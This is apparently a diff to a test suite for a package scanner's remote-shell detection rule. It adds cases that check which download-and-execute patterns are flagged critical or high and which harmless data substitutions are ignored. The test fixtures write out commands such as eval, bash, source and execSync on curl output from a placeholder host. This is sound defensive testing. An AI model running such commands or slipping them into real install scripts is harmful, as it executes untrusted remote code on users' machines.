@@ -3156,7 +3156,7 @@ describe("prompt-injection scan memory bounds", () => {
 describe("code.remote-shell download-and-execute coverage", () => {
   const manifest = { name: "p", version: "1.0.1", main: "index.js" };
 
-  function findingsFor(path, source) {
+  function findingsFor(path, source, options = {}) {
     const stagedFiles = [
       {
         path: "package.json",
@@ -3168,7 +3168,7 @@ describe("code.remote-shell download-and-execute coverage", () => {
       { path, size: source.length, sha256: "d", flags: [], textSample: source },
     ];
     const diff = createPackageDiff([], stagedFiles);
-    return deterministicFindings(stagedFiles, diff, manifest).filter(
+    return deterministicFindings(stagedFiles, diff, manifest, options).filter(
       (finding) => finding.ruleId === "code.remote-shell",
     );
   }
@@ -3190,6 +3190,137 @@ describe("code.remote-shell download-and-execute coverage", () => {
     const findings = findingsFor("index.js", `require("child_process").${command}\n`);
     expect(findings).toHaveLength(1);
     expect(findings[0].severity).toBe("critical");
+  });
+
+  test.each([
+    ["command substitution passed to eval", 'eval "$(curl -s https://example.invalid/p)"'],
+    ["unquoted eval substitution", "eval $(curl -s https://example.invalid/p)"],
+    ["backtick substitution passed to eval", "eval `curl -s https://example.invalid/p`"],
+    ["shell command argument", 'bash -c "$(curl -s https://example.invalid/p)"'],
+    [
+      "shell flags before command argument",
+      'bash --noprofile -c "$(curl -s https://example.invalid/p)"',
+    ],
+    ["eval options separator", "eval -- $(curl -s https://example.invalid/p)"],
+    ["interpreter process substitution", "bash <(curl -s https://example.invalid/p)"],
+    ["source process substitution", "source <(curl -s https://example.invalid/p)"],
+    ["dot process substitution", ". <(curl -s https://example.invalid/p)"],
+    ["loopback response execution", 'eval "$(curl -s localhost:3000/bins)"'],
+    ["command-position substitution", "$(curl -s https://example.invalid/p)"],
+  ])("keeps %s critical", (_label, source) => {
+    const findings = findingsFor("install.sh", source);
+    expect(findings).toEqual([
+      expect.objectContaining({ ruleId: "code.remote-shell", severity: "critical" }),
+    ]);
+  });
+
+  test("keeps a quoted dot-source command critical", () => {
+    const findings = findingsFor(
+      "index.js",
+      'require("child_process").execSync(". <(curl -s https://example.invalid/p)");',
+    );
+    expect(findings).toEqual([
+      expect.objectContaining({ ruleId: "code.remote-shell", severity: "critical" }),
+    ]);
+  });
+
+  test.each(["exec", "execSync"])(
+    "keeps command-position substitution passed to %s critical",
+    (api) => {
+      const findings = findingsFor(
+        "index.js",
+        `require("child_process").${api}("$(curl -s https://example.invalid/p)");`,
+      );
+      expect(findings).toEqual([
+        expect.objectContaining({ ruleId: "code.remote-shell", severity: "critical" }),
+      ]);
+    },
+  );
+
+  const dataCommands = [
+    "ID=$(curl -s localhost:3000/bins | jq -r .id)",
+    "ID=`curl -s localhost:3000/bins | jq -r .id`",
+    "diff <(curl -s https://example.invalid/old) <(curl -s https://example.invalid/new)",
+  ];
+
+  test.each([
+    ["CHANGELOG.json", (command) => JSON.stringify({ notes: command })],
+    ["docs/index.html", (command) => `<pre>${command}</pre>`],
+    ["docs/usage.txt", (command) => command],
+    ["CHANGELOG.md", (command) => `Example: \`${command}\``],
+  ])("does not infer execution from data substitutions in %s", (path, format) => {
+    for (const command of dataCommands) {
+      expect(findingsFor(path, format(command))).toHaveLength(0);
+    }
+  });
+
+  test("does not read a JavaScript template delimiter as shell backtick execution", () => {
+    expect(
+      findingsFor("index.js", "export const example = `curl -s localhost:3000/bins | jq -r .id`;"),
+    ).toHaveLength(0);
+  });
+
+  test("does not infer command position from an arbitrary exported string", () => {
+    expect(
+      findingsFor("index.js", 'export const example = "$(curl -s https://example.invalid/p)";'),
+    ).toHaveLength(0);
+  });
+
+  test.each(dataCommands)("keeps executed data command at high: %s", (command) => {
+    const findings = findingsFor(
+      "index.js",
+      `require("child_process").execSync(${JSON.stringify(command)});`,
+    );
+    expect(findings).toEqual([
+      expect.objectContaining({ ruleId: "code.remote-shell", severity: "high" }),
+    ]);
+  });
+
+  test("keeps an execSync template command that parses JSON at high", () => {
+    const findings = findingsFor(
+      "index.js",
+      'require("child_process").execSync(`curl -s localhost:3000/bins | jq -r .id`);',
+    );
+    expect(findings).toEqual([
+      expect.objectContaining({ ruleId: "code.remote-shell", severity: "high" }),
+    ]);
+  });
+
+  test.each(["bash -c", "python -c", "bash -s", "python -m"])(
+    "does not interpret process substitution pathnames as downloaded code with %s",
+    (consumer) => {
+      const command = `${consumer} <(curl -s https://example.invalid/p)`;
+      const findings = findingsFor(
+        "index.js",
+        `require("child_process").execSync(${JSON.stringify(command)});`,
+      );
+      expect(findings).toEqual([
+        expect.objectContaining({ ruleId: "code.remote-shell", severity: "high" }),
+      ]);
+    },
+  );
+
+  test.each([
+    ["ID=$(curl -s localhost:3000/bins | jq -r .id)", "high"],
+    ['eval "$(curl -s https://example.invalid/p)"', "critical"],
+  ])("uses the same substitution semantics for Python: %s", (command, severity) => {
+    const findings = findingsFor(
+      "setup.py",
+      `import subprocess\nsubprocess.run(${JSON.stringify(command)}, shell=True)\n`,
+      { codePatternSet: "python" },
+    );
+    expect(findings).toEqual([expect.objectContaining({ ruleId: "code.remote-shell", severity })]);
+  });
+
+  test("keeps command-position substitution passed to Python os.system critical", () => {
+    const findings = findingsFor(
+      "setup.py",
+      'import os\nos.system("$(curl -s https://example.invalid/p)")\n',
+      { codePatternSet: "python" },
+    );
+    expect(findings).toEqual([
+      expect.objectContaining({ ruleId: "code.remote-shell", severity: "critical" }),
+    ]);
   });
 
   // The trailing word boundary is what separates an interpreter from a
